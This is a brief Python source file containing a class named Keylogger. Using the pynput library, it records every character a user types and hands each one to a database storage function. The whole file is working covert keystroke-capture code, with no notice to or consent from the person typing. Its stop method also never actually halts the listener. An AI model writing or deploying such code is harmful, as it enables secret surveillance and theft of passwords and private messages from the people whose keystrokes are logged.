from pynput import keyboard
import os
from datetime import datetime
import db

class Keylogger:
    def __init__(self):
        self.running = True

    def on_press(self, key):
        try:
            db.store_keylog(str(key.char))
        except AttributeError:
            pass

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def stop(self):
        self.running = False
